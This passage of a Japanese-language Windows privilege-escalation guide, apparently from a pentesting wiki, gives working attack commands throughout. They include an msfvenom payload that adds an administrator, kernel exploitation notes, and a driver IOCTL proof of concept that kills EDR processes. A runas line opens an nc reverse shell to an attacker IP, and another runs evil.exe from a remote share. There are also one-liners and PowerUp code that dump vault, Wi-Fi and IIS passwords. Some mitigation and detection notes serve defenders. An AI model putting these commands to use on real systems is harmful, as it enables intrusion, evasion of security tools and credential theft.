**metasploitで検出および悪用できます**この脆弱性：`exploit/windows/local/trusted\_service\_path` metasploitでサービスバイナリを手動作成できます：
```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```
### 回復アクション

Windowsでは、サービスが失敗した場合に実行するアクションをユーザーが指定できます。この機能は、バイナリを指すように設定できます。このバイナリを置き換え可能な場合、権限昇格が可能になることがあります。詳細は[公式ドキュメント](<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662(v=ws.11)?redirectedfrom=MSDN>)を参照してください。

## アプリケーション

### インストール済みアプリケーション

**バイナリの権限**（置き換えて権限昇格できる可能性があります）と、フォルダーの権限（[DLL Hijacking](dll-hijacking/index.html)）を確認します。
```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```
### 書き込み権限

一部の設定ファイルを変更して特殊なファイルを読み取れるか、または Administrator アカウントによって実行されるバイナリ（schedtasks）を変更できるかを確認します。

システム内の権限が弱いフォルダーやファイルを見つける方法は次のとおりです。
```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```
### Notepad++ プラグインの autoload による persistence/execution

Notepad++ は、`plugins` サブフォルダー内にある任意のプラグイン DLL を autoload します。書き込み可能な portable/copy install が存在する場合、悪意のあるプラグインを配置することで、起動するたびに `notepad++.exe` 内で自動的に code execution が発生します（`DllMain` やプラグインの callbacks からも実行可能です）。

{{#ref}}
notepad-plus-plus-plugin-autoload-persistence.md
{{#endref}}

### startup 時の実行

**別の user によって実行される registry または binary を上書きできるか確認します。**\
**以下のページを読み、privileges を escalate するために有用な **autoruns locations** について詳しく学びます。**


{{#ref}}
privilege-escalation-with-autorun-binaries.md
{{#endref}}

### Drivers

**third party の奇妙な／vulnerable な** drivers を探します
```bash
driverquery
driverquery.exe /fo table
driverquery /SI
```
ドライバーが任意の kernel read/write primitive（設計の悪い IOCTL handler でよく見られるもの）を公開している場合、kernel memory から SYSTEM token を直接盗むことで privilege escalation できます。<sup>[[13]](#references)</sup> step-by-step technique は以下を参照してください：

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

vulnerable call が attacker-controlled Object Manager path を開く race-condition bug では、lookup を意図的に遅延させる（max-length components や deep directory chains を使用する）ことで、window を数 microseconds から数十 microseconds まで引き延ばせます：

{{#ref}}
kernel-race-condition-object-manager-slowdown.md
{{#endref}}

#### Cancel-safe queue UAF、paged-pool disclosure、I/O ring pivot

一部の Windows kernel LPE chain は、個別には弱い2つの bug から構築できます。1つは、queue lock が保持されたまま request/CBD を解放する **cancel-safe queue lifetime race**、もう1つは、`RtlCopyToUser` 中に解放済みの paged-pool allocation を leak する **lock-release-before-copy disclosure** です。<sup>[[29]](#references)</sup>

Audit と exploitation に関する注意事項：

- **Free-under-lock + cancel afterwards**：success path が **Acquire -> CompleteRequest/free -> Release** を実行し、cancel path が **Acquire -> RemoveIo(stale pointer) -> Release -> CompleteCanceledIo** を実行する箇所を探します。success path が CBDQ/CSQ lock を解放する前に `FltCompletePendedPreOperation` / `FltpFreeIrpCtrl` に到達する場合、`NtCancelIoFileEx -> IopCsqCancelRoutine` で block されていた thread が後から再開し、解放済みの `PFLT_CALLBACK_DATA` を driver の remove callback に渡す可能性があります。
- 解放された queue object を、同じサイズの attacker-controlled paged-pool allocation で **reclaim** します。`NPFS` Data Queue Entries は payload と size を制御でき、後から pipe read/peek operations で probe できるため便利です。解放された object が list links を内包している場合は、それらを **user memory 内の fake request nodes の cyclic list** で上書きします。これにより、driver は元の list head で終了せず、attacker が定義した request structures を繰り返し処理するようになります。
- **予測可能な write を upgrade する**：fake request が bookkeeping writes（timestamps / QPC / refcount-adjacent fields）で使用される nested context pointer を redirect する場合、**address-controlled but not value-controlled** な kernel write を取得できる可能性があります。その場合、最終的な code/data pointer ではなく、sprayed pool object の **length/size** field を target にし、その後 spray を列挙して、破損した object が **out-of-bounds paged-pool read** を引き起こすまで試します。
- **Raceable disclosure pattern**：`ptr = obj->Buffer; unlock(obj); RtlCopyToUser(dst, ptr, size)` を実行する syscall は、強力な candidate です。attacker が copied buffer を拡大できる場合（たとえば、多数の list/resource entries を追加して serializer の最終 allocation size を増加させるなど）、reliability が向上します。これにより、必ずしも machine を crash させずに、より長い copy によって replacement window を広げられます。
- **Pointer-rich refill targets**：Windows **I/O ring** registered-buffer arrays は優れた disclosure target です。paged-pool size を attacker が制御でき（`8 * regBufferCnt`）、各 element が `_IOP_MC_BUFFER_ENTRY` への kernel pointer だからです。これらの array の1つを leak し、周辺の `IORING_OBJECT` を復元した後、**`RegBuffers`** と **`RegBuffersCount`** を corrupt します。これにより、後続の I/O ring operations が attacker-forged entries を消費し、arbitrary kernel read/write を提供するようになります。利用可能な write が stable byte（たとえば `KUSER_SHARED_DATA+0x14` 由来のもの）しか提供しない場合は、**overlapping unaligned writes** を使用して `0x0101010101010101` のような repeated-byte user pointer を構築し、`VirtualAlloc` でそれを map して、そこに forged registered-buffer array を配置します。<sup>[[30]](#references)</sup>

Useful debugging indicators：
```text
NtCancelIoFileEx -> IopCsqCancelRoutine -> <driver>!RemoveIo
<driver> success path: Acquire -> CompleteRequest/free -> Release
RtlCopyToUser after releasing the object lock
ExAllocatePool2(..., 8 * regBufferCnt, 'BRrI')-style variable-sized pointer arrays
```
Once you obtain arbitrary kernel read/write from the corrupted I/O ring, steal a SYSTEM token using the standard post-primitive workflow:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

#### Registry hive memory corruption primitives

Modern hive vulnerabilities let you groom deterministic layouts, abuse writable HKLM/HKU descendants, and convert metadata corruption into kernel paged-pool overflows without a custom driver. 完全な chain についてはこちらを参照してください:

{{#ref}}
windows-registry-hive-exploitation.md
{{#endref}}

#### `RtlQueryRegistryValues` direct-mode type confusion from attacker-controlled paths

一部の drivers は userland から registry path を受け取り、それが正常な UTF-16 string であることだけを検証した後、`RtlQueryRegistryValues(RTL_REGISTRY_ABSOLUTE, userPath, ...)` を `int readValue` のような stack scalar に対して `RTL_QUERY_REGISTRY_DIRECT` で呼び出します。`RTL_QUERY_REGISTRY_TYPECHECK` がない場合、`EntryContext` は developer が想定した type ではなく、**実際の** registry type に従って解釈されます。

これにより、次の2つの有用な primitives が得られます:<sup>[[24]](#references)[[25]](#references)</sup>

- **Confused deputy / oracle**: user-controlled な absolute `\Registry\...` path により、driver は attacker が選択した keys を query でき、return codes/logs を通じて存在を leak し、場合によっては caller が直接 access できない values も読み取れます。
- **Kernel memory corruption**: `&readValue` のような scalar destination は、registry value type に応じて `REG_QWORD`、`UNICODE_STRING`、またはサイズ指定された binary buffer として type-confused されます。

実際の exploitation に関する注意点:

- **Windows 8+ mitigation**: query が **untrusted hive** に対して、`RTL_QUERY_REGISTRY_DIRECT` を使用しつつ `RTL_QUERY_REGISTRY_TYPECHECK` を指定していない場合、kernel callers は `KERNEL_SECURITY_CHECK_FAILURE (0x139)` で crash します。exploitability を維持するには、values を `HKCU` 配下に staging するのではなく、**trusted system hives 内の attacker-writable keys** を探してください。
- **Trusted-hive staging**: NtObjectManager を使用して `\Registry\Machine` の writable descendants を列挙し、duplicated **low-integrity** token で scan を再実行して、sandboxed contexts から到達可能な keys を見つけます:<sup>[[26]](#references)</sup>
```powershell
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue
$token = Get-NtToken -Primary -Duplicate -IntegrityLevel Low
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue -Token $token
```
- **`REG_QWORD`**: 4-byte の `int` に対する 8-byte の直接書き込みにより、隣接する stack data が破壊され、近傍の callback/function pointer を部分的に上書きできる。
- **`REG_SZ` / `REG_EXPAND_SZ`**: direct mode では、`EntryContext` が `UNICODE_STRING` を指していることを想定する。コードがまず attacker-controlled な `REG_DWORD` を stack scalar に読み込み、その後、同じ buffer を string read に再利用すると、攻撃者が `Length` / `MaximumLength` を制御し、`Buffer` pointer に部分的な影響を与えられるため、semi-controlled kernel write が発生する。
- **`REG_BINARY`**: 大きな binary data の場合、direct mode は `EntryContext` にある最初の `LONG` を signed buffer size として扱う。以前の `REG_DWORD` read により、再利用された scalar に **negative な attacker-controlled value** が残っていると、次の `REG_BINARY` query が attacker bytes を隣接する stack slots に直接コピーする。これは、多くの場合、callback-pointer overwrite を完全に行う最も簡潔な経路となる。

Strong hunting pattern: **同じ stack variable に対する heterogeneous registry reads を、再初期化せずに行っている箇所**。`RTL_REGISTRY_ABSOLUTE`、`RTL_QUERY_REGISTRY_DIRECT`、再利用された `EntryContext` pointers、および最初の registry read が 2 回目の read を実行するかどうかを制御する code path を grep する。

#### Abusing missing FILE_DEVICE_SECURE_OPEN on device objects (LPE + EDR kill)

一部の signed third-party drivers は、IoCreateDeviceSecure を使用して strong SDDL を設定した device object を作成するが、DeviceCharacteristics に FILE_DEVICE_SECURE_OPEN を設定し忘れる。この flag がない場合、extra component を含む path 経由で device を open すると secure DACL が適用されない。そのため、権限のない user でも、次のような namespace path を使用して handle を取得できる:<sup>[[14]](#references)</sup>

- \\ .\\DeviceName\\anything
- \\ .\\amsdk\\anyfile (real-world case)

user が device を open できるようになると、driver が公開する privileged IOCTL を LPE や tampering に悪用できる。実際の環境では、次の capabilities が確認されている:
- 任意の process に対する full-access handles を返す（token theft / DuplicateTokenEx/CreateProcessAsUser による SYSTEM shell）。
- 制限のない raw disk read/write（offline tampering、boot-time persistence tricks）。
- Protected Process/Light (PP/PPL) を含む任意の process を terminate し、kernel 経由で user land から AV/EDR kill を可能にする。

Minimal PoC pattern (user mode):
```c
// Example based on a vulnerable antimalware driver
#define IOCTL_REGISTER_PROCESS  0x80002010
#define IOCTL_TERMINATE_PROCESS 0x80002048

HANDLE h = CreateFileA("\\\\.\\amsdk\\anyfile", GENERIC_READ|GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
DWORD me = GetCurrentProcessId();
DWORD target = /* PID to kill or open */;
DeviceIoControl(h, IOCTL_REGISTER_PROCESS,  &me,     sizeof(me),     0, 0, 0, 0);
DeviceIoControl(h, IOCTL_TERMINATE_PROCESS, &target, sizeof(target), 0, 0, 0, 0);
```
開発者向けのMitigations
- DACLによる制限を意図したdevice objectsを作成する際は、常にFILE_DEVICE_SECURE_OPENを設定する。
- privileged operationsではcaller contextを検証する。process terminationまたはhandle returnsを許可する前に、PP/PPL checksを追加する。
- IOCTLs（access masks、METHOD_*、input validation）を制限し、直接的なkernel privilegesではなくbrokered modelsの利用を検討する。

defenders向けのDetection ideas
- suspiciousなdevice names（例：\\ .\\amsdk*）のuser-mode opensと、abuseを示す特定のIOCTL sequencesを監視する。
- Microsoftのvulnerable driver blocklist（HVCI/WDAC/Smart App Control）を適用し、独自のallow/deny listsを維持する。


## PATH DLL Hijacking

**PATH上に存在するfolder内へのwrite permissions**がある場合、processによってloadされるDLLをhijackし、**privilegesをescalate**できる可能性があります。<sup>[[2]](#references)</sup>

PATH内のすべてのfolderのpermissionsを確認します：
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
For more information about how to abuse this check:


{{#ref}}
dll-hijacking/writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

## Node.js / Electron module resolution hijacking via `C:\node_modules`

これは、`require("foo")` のような bare import を実行し、想定された module が **missing** の場合に **Node.js** および **Electron** アプリケーションへ影響する **Windows uncontrolled search path** の variant です。<sup>[[20]](#references)</sup>

Node はディレクトリツリーを上方向へたどり、各親ディレクトリにある `node_modules` フォルダを確認して package を解決します。Windows では、この探索がドライブの root まで到達する可能性があるため、`C:\Users\Administrator\project\app.js` から起動されたアプリケーションは、最終的に以下を probe することがあります。<sup>[[21]](#references)</sup>

1. `C:\Users\Administrator\project\node_modules\foo`
2. `C:\Users\Administrator\node_modules\foo`
3. `C:\Users\node_modules\foo`
4. `C:\node_modules\foo`

**low-privileged user** が `C:\node_modules` を作成できる場合、悪意のある `foo.js`（または package folder）を配置し、**higher-privileged Node/Electron process** が missing dependency を解決するのを待つことができます。payload は victim process の security context で実行されるため、target が administrator として実行されている場合、elevated scheduled task/service wrapper から実行されている場合、または auto-start された privileged desktop app である場合、これは **LPE** になります。

これは、特に以下の場合に多く見られます。

- dependency が `optionalDependencies` に宣言されている<sup>[[22]](#references)</sup>
- third-party library が `require("foo")` を `try/catch` でラップし、failure 時も処理を継続する
- production build から package が削除された、packaging 中に除外された、または install に失敗した
- vulnerable な `require()` が main application code ではなく、dependency tree の深い位置に存在する

### 脆弱な target の Hunting

Procmon を使用して resolution path を証明します。<sup>[[23]](#references)</sup>

- `Process Name` = target executable（`node.exe`、Electron app EXE、または wrapper process）で filter
- `Path` `contains` `node_modules` で filter
- `NAME NOT FOUND` と、`C:\node_modules` 配下で最終的に成功する open に注目する

unpacked `.asar` files または application sources で役立つ code-review patterns:
```bash
rg -n 'require\\("[^./]' .
rg -n "require\\('[^./]" .
rg -n 'optionalDependencies' .
rg -n 'try[[:space:]]*\\{[[:space:][:print:]]*require\\(' .
```
### Exploitation

1. Procmonまたはソースレビューから**不足しているパッケージ名**を特定します。
2. ルートの検索ディレクトリがまだ存在しない場合は作成します：
```powershell
mkdir C:\node_modules
```
3. 想定される正確な名前のモジュールを配置する：
```javascript
// C:\node_modules\foo.js
require("child_process").exec("calc.exe")
module.exports = {}
```
4. 被害者アプリケーションをトリガーする。アプリケーションが `require("foo")` を試行し、正規のモジュールが存在しない場合、Node は `C:\node_modules\foo.js` をロードする可能性がある。

このパターンに当てはまる、実際に存在する欠落した optional module の例としては `bluebird` や `utf-8-validate` がある。ただし、再利用可能な **technique** は、特権 Windows Node/Electron プロセスが解決する、任意の **missing bare import** を見つけることである。

### 検出と hardening のアイデア

- ユーザーによる `C:\node_modules` の作成、またはそこへの新しい `.js` ファイル／package の書き込みをアラートする。
- `C:\node_modules\*` から読み取る high-integrity プロセスを調査する。
- 本番環境ではすべての runtime dependencies を package 化し、`optionalDependencies` の使用状況を audit する。
- サードパーティーコードで、`try { require("...") } catch {}` のようにエラーを黙って処理するパターンを確認する。
- library が対応している場合は optional probe を無効化する（例えば、一部の `ws` deployment では `WS_NO_UTF_8_VALIDATE=1` により legacy の `utf-8-validate` probe を回避できる）。

## ネットワーク

### 共有
```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```
### hosts file

hosts fileにハードコードされている、その他の既知のコンピューターを確認します
```
type C:\Windows\System32\drivers\etc\hosts
```
### ネットワークインターフェースとDNS
```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```
### 開いているポート

外部から **制限されたサービス** を確認する
```bash
netstat -ano #Opened ports?
```
### ルーティングテーブル
```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```
### ARPテーブル
```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```
### ファイアウォールルール

[**ファイアウォール関連のコマンドについてはこのページを確認してください**](../basic-cmd-for-pentesters.md#firewall) **(ルールの一覧表示、ルールの作成、無効化、無効化...)**

ネットワーク列挙用の[コマンドはこちら](../basic-cmd-for-pentesters.md#network)

### Windows Subsystem for Linux (wsl)
```bash
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```
バイナリ `bash.exe` は `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe` にもあります。

root ユーザーを取得すると、任意のポートで listen できます（初めて `nc.exe` を使用してポートを listen すると、`nc` による通信を firewall で許可するかどうかを GUI で確認されます）。
```bash
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```
root として bash を簡単に起動するには、`--default-user root` を試してください

`WSL` ファイルシステムは、`C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\` フォルダーで確認できます

## Windows の認証情報

### Winlogon の認証情報
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```
### Credentials manager / Windows vault

From [https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)<sup>[[34]](#references)</sup>\
Windows Vault には、**Windows** がユーザーを**自動的にログインさせる**ことができるサーバー、Webサイト、その他のプログラム用の認証情報が保存されます。最初は、ユーザーが Facebook、Twitter、Gmail などの認証情報を保存して、ブラウザ経由で自動的にログインできるようにする機能のように思えるかもしれません。しかし、そうではありません。

Windows Vault には、Windows がユーザーを自動的にログインさせるための認証情報が保存されます。つまり、**リソース（サーバーまたはWebサイト）にアクセスするために認証情報を必要とするWindowsアプリケーション**は、この Credential Manager と Windows Vault を利用し、ユーザーが毎回ユーザー名とパスワードを入力する代わりに、保存されている認証情報を使用できます。

アプリケーションが Credential Manager と連携しない限り、特定のリソース用の認証情報を使用することはできないと思われます。したがって、アプリケーションで vault を利用したい場合は、何らかの方法で**credential manager と通信し、そのリソースの認証情報を**デフォルトのストレージ vault から要求する必要があります。

`cmdkey` を使用して、マシンに保存されている認証情報を一覧表示します。
```bash
cmdkey /list
Currently stored credentials:
Target: Domain:interactive=WORKGROUP\Administrator
Type: Domain Password
User: WORKGROUP\Administrator
```
その後、保存された認証情報を使用するために、`/savecred` オプションを指定して `runas` を使用できます。以下の例では、SMB share 経由でリモートバイナリを呼び出しています。
```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```
提供された認証情報セットで `runas` を使用する。
```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```
mimikatz、lazagne、[credentialfileview](https://www.nirsoft.net/utils/credentials_file_view.html)、[VaultPasswordView](https://www.nirsoft.net/utils/vault_password_view.html)、または[Empire Powershells module](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/dumpCredStore.ps1)から取得できることに注意してください。

### UWP PasswordVault / Credential Locker

最新の Windows UWP アプリケーション、Microsoft Edge、および最新のシステムサービスは、認証トークンと平文パスワードを Universal Windows Platform (UWP) の `PasswordVault`（`vaultcmd` では `Web Credentials` としても公開されています）内に保存します。このストレージ領域はセッションごとに分離されており、管理者権限や `SeDebugPrivilege` 権限がなくてもネイティブに復号できます。

ユーザーのアクティブなセッション内で以下の PowerShell コマンドを実行すると、保存されているすべてのユーザー名と平文パスワードを即座にダンプして復号できます:
```ps1
[void][Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]; $v = New-Object Windows.Security.Credentials.PasswordVault; $v.RetrieveAll() | ForEach-Object { try { $_.RetrievePassword(); $_ } catch {} } | Select-Object Resource, UserName, Password | Format-List
```
### DPAPI

**Data Protection API (DPAPI)** は、主に Windows オペレーティングシステム内で非対称秘密鍵を対称暗号化するために使用される、データの対称暗号化方式を提供します。この暗号化では、ユーザーまたはシステムの秘密情報を利用して、エントロピーに大きく寄与させます。

**DPAPI は、ユーザーのログイン秘密情報から派生した対称鍵を使用して鍵を暗号化できます**。システムの暗号化に関わる場合は、システムのドメイン認証秘密情報を使用します。

DPAPI を使用して暗号化されたユーザー RSA 鍵は、`%APPDATA%\Microsoft\Protect\{SID}` ディレクトリに保存されます。ここで `{SID}` はユーザーの [セキュリティ識別子](https://en.wikipedia.org/wiki/Security_Identifier) を表します。**同じファイル内でユーザーの秘密鍵を保護する master key とともに配置される DPAPI key** は、通常、ランダムな 64 バイトのデータで構成されます。（このディレクトリへのアクセスは制限されているため、CMD の `dir` コマンドでは内容を一覧表示できませんが、PowerShell では一覧表示できます）。
```bash
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```
**mimikatz module** `dpapi::masterkey` に適切な引数（`/pvk` または `/rpc`）を指定して、decrypt できます。

**master password で保護された credentials files** は、通常次の場所にあります：
```bash
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
適切な `/masterkey` を使用して、**mimikatz module** `dpapi::cred` で復号できます。\
`sekurlsa::dpapi` module を使用すると、**memory** から多数の **DPAPI** **masterkeys** を **extract** できます（root の場合）。

{{#ref}}
dpapi-extracting-passwords.md
{{#endref}}

### PowerShell Credentials

**PowerShell credentials** は、暗号化された credentials を便利に保存する方法として、**scripting** や自動化タスクでよく使用されます。credentials は **DPAPI** を使用して保護されているため、通常は作成時と同じコンピューター上の同じユーザーでのみ復号できます。

それを含むファイルから PS credentials を **decrypt** するには、次のように実行します。
```bash
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```
### Wi-Fi
```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```
### 保存された RDP 接続

`HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers\`\
および `HKCU\Software\Microsoft\Terminal Server Client\Servers\` にあります。

### 最近実行したコマンド
```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```
### **リモートデスクトップ資格情報マネージャー**
```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```
`/masterkey` を適切に指定して **Mimikatz** の `dpapi::rdg` モジュールを使用すると、**任意の .rdg ファイルを復号**できます\
Mimikatz の `sekurlsa::dpapi` モジュールを使用すると、メモリから **多数の DPAPI masterkeys を抽出**できます

### Sticky Notes

Windows ワークステーションでは、ユーザーが Sticky Notes アプリを使って**パスワード**やその他の情報を**保存**していることがよくありますが、これがデータベースファイルであることに気付いていない場合があります。このファイルは `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite` にあり、常に検索して調査する価値があります。

### AppCmd.exe

**AppCmd.exe からパスワードを復元するには、Administrator 権限が必要で、High Integrity レベルで実行する必要がある点に注意してください。**\
**AppCmd.exe** は `%systemroot%\system32\inetsrv\` ディレクトリにあります。\
このファイルが存在する場合、何らかの**認証情報**が設定されており、**復元できる**可能性があります。

このコードは [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1) から抽出されました：
```bash
function Get-ApplicationHost {
$OrigError = $ErrorActionPreference
$ErrorActionPreference = "SilentlyContinue"

# Check if appcmd.exe exists
if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
# Create data table to house results
$DataTable = New-Object System.Data.DataTable

# Create and name columns in the data table
$Null = $DataTable.Columns.Add("user")
$Null = $DataTable.Columns.Add("pass")
$Null = $DataTable.Columns.Add("type")
$Null = $DataTable.Columns.Add("vdir")
$Null = $DataTable.Columns.Add("apppool")

# Get list of application pools
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

# Get application pool name
$PoolName = $_

# Get username
$PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
$PoolUser = Invoke-Expression $PoolUserCmd

# Get password
$PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
$PoolPassword = Invoke-Expression $PoolPasswordCmd

# Check if credentials exists
if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
}
}

# Get list of virtual directories
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

# Get Virtual Directory Name
$VdirName = $_

# Get username
$VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
$VdirUser = Invoke-Expression $VdirUserCmd

# Get password
$VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
$VdirPassword = Invoke-Expression $VdirPasswordCmd

# Check if credentials exists
if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
}
}

# Check if any passwords were found
if( $DataTable.rows.Count -gt 0 ) {
# Display results in list view that can feed into the pipeline
$DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
}
else {
# Status user
Write-Verbose 'No application pool or virtual directory passwords were found.'
$False
}
}
else {
Write-Verbose 'Appcmd.exe does not exist in the default location.'
$False
}
$ErrorActionPreference = $OrigError
}
```
### SCClient / SCCM

`C:\Windows\CCM\SCClient.exe` が存在するか確認します。\
インストーラーは **SYSTEM privileges で実行され**、多くは **DLL Sideloading に対して脆弱です（情報提供元: ** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**）。**
```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```
## ファイルとレジストリ（認証情報）

### PuTTY 認証情報
```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```
### Putty SSH ホストキー
```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```
### レジストリ内の SSH keys

SSH private keys can be stored inside the registry key `HKCU\Software\OpenSSH\Agent\Keys` so you should check if there is anything interesting in there:
```bash
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```
そのパス内にエントリが見つかった場合、それはおそらく保存された SSH key です。暗号化されて保存されていますが、[https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract) を使用すれば簡単に復号できます。\
この technique の詳細については、こちらを参照してください: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)<sup>[[37]](#references)</sup>

`ssh-agent` service が実行されておらず、boot 時に自動的に起動したい場合は、次を実行します:
```bash
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```
> [!TIP]
> この technique はもう有効ではないようです。いくつかの ssh keys を作成し、`ssh-add` で追加して、ssh 経由でマシンに login してみました。しかし、レジストリ HKCU\Software\OpenSSH\Agent\Keys は存在せず、procmon でも非対称 key authentication 中に `dpapi.dll` が使用されたことは確認できませんでした。

### Unattended files
```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
